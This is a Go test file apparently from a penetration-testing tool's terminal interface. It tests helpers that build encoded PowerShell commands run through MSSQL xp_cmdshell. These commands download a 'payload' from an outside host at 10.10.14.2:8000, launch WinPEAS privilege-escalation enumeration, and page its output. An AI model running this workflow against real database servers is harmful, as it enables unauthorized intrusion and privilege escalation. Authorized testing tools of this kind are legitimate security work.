package tui

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

func decodedMSSQLPS(t *testing.T, q string) string {
	t.Helper()
	i := strings.Index(q, "-EncodedCommand ")
	if i < 0 {
		t.Fatal("missing encoded PowerShell")
	}
	encoded := strings.TrimSuffix(q[i+len("-EncodedCommand "):], "'")
	b, e := base64.StdEncoding.DecodeString(encoded)
	if e != nil {
		t.Fatal(e)
	}
	u := []uint16{}
	for i := 0; i < len(b); i += 2 {
		u = append(u, binary.LittleEndian.Uint16(b[i:]))
	}
	return string(utf16.Decode(u))
}
func TestMSSQLTransferScriptAndWorkflow(t *testing.T) {
	script := mssqlDownloadScript("http://10.10.14.2:8000/payload", `%TEMP%\it's.exe`, strings.Repeat("a", 64))
	q := mssqlPowerShellQuery(script)
	if len(q) > 4000 || !strings.Contains(decodedMSSQLPS(t, q), "SHA256 mismatch") || !strings.Contains(script, "it''s.exe") || !strings.Contains(script, "Destination already exists") {
		t.Fatal("unsafe or unverified transfer")
	}
	m := newTestModelForCredentials(t)
	m.screen = "mssql-actions"
	m.current.AllowExploit = true
	m.mssqlConsole.actionIndex = 13
	got, _ := m.updateMSSQL("enter")
	m = got.(model)
	if m.inputAction != "mssql-transfer-local" {
		t.Fatal("missing local file prompt")
	}
	m.input = "/tmp/tool.exe"
	got, _ = m.updateInput(enterKey())
	m = got.(model)
	if m.inputAction != "mssql-transfer-address" {
		t.Fatal("missing address prompt")
	}
	m.input = "10.10.14.2"
	got, _ = m.updateInput(enterKey())
	m = got.(model)
	if m.inputAction != "mssql-transfer-port" || m.input != "8000" {
		t.Fatal("missing default port")
	}
	got, _ = m.updateInput(enterKey())
	m = got.(model)
	if m.inputAction != "mssql-transfer-remote" {
		t.Fatal("missing remote destination")
	}
	if m.mssqlConsole.transferPort != 8000 {
		t.Fatal("port lost")
	}
}
func TestMSSQLWinPEASAndReportScripts(t *testing.T) {
	s := mssqlWinPEASScript(`C:\Tools\it's.exe`)
	if !strings.Contains(s, "it''s.exe") || !strings.Contains(s, "Start-Process") || strings.Contains(s, "-Wait") || !strings.Contains(s, "RedirectStandardOutput") {
		t.Fatal("background report missing")
	}
	s = mssqlReportScript(`%TEMP%\winPEAS.exe.txt`, 400)
	if !strings.Contains(s, "-Skip 400 -First 400") || !strings.Contains(s, "$env:TEMP") {
		t.Fatal("paging missing")
	}
	if len(mssqlPowerShellQuery(s)) > 4000 {
		t.Fatal("command exceeds xp_cmdshell limit")
	}
}

func TestMSSQLTransferSuccessMarker(t *testing.T) {
	if mssqlResultHasMarker(nil, "TRANSFER_OK ") {
		t.Fatal("nil result succeeded")
	}
	result := map[string]any{"ResultSets": []map[string]any{{"Rows": [][]any{{"SHA256 mismatch"}, {nil}}}}}
	if mssqlResultHasMarker(result, "TRANSFER_OK ") {
		t.Fatal("remote failure succeeded")
	}
	result["ResultSets"] = []map[string]any{{"Rows": [][]any{{"TRANSFER_OK C:\\Tools\\tool.exe"}}}}
	if !mssqlResultHasMarker(result, "TRANSFER_OK ") {
		t.Fatal("success missing")
	}
}
